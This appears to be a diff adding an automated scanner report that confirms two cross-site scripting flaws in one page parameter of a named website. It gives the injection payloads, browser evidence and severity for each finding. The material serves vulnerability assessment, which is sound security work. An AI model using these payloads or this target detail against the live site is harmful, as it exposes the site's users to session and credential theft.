@@ -1,0 +1,34 @@
+======================================================================
+  XSsDetector Report — Confirmed Findings Only
+  Target:    https://steerwings.com/
+  Generated: 2026-08-03T07:42:19.492581+00:00
+  Total confirmed findings: 2
+======================================================================
+
+[1] Reflected XSS – id @ https://steerwings.com/university-details.php?id=3
+    Method:     GET
+    Param Type: query
+    XSS Type:   Reflected XSS
+    Context:    HTML Attribute (double-quoted)
+    Payload:    "><script>alert(1)</script>
+    Evidence:   Score=83, reflected=True, reflection_type=transformed | Browser: Dialog triggered: alert:1 | Payload present in live DOM
+    Severity:   HIGH
+    Impact:     Session hijacking, credential theft, DOM manipulation
+    Score:      100/100
+    Screenshot: xssdetector_screenshots\0001_a24aae22.png
+    DOM Snapshot: xssdetector_screenshots\0002_a24aae22_dom.html
+
+[2] DOM-Based XSS – id @ https://steerwings.com/university-details.php?id=3
+    Method:     GET
+    Param Type: query
+    XSS Type:   DOM-Based XSS
+    Context:    DOM Sink
+    Payload:    #"><img src=x onerror=alert(1)>
+    Evidence:   Dialog triggered: alert:1 | Event handler 'onerror' found in live DOM
+    Severity:   HIGH
+    Impact:     DOM-based XSS – client‑side script injection
+    Score:      100/100
+    Screenshot: xssdetector_screenshots\0003_03d02864.png
+    DOM Snapshot: xssdetector_screenshots\0004_03d02864_dom.html
+
+======================================================================
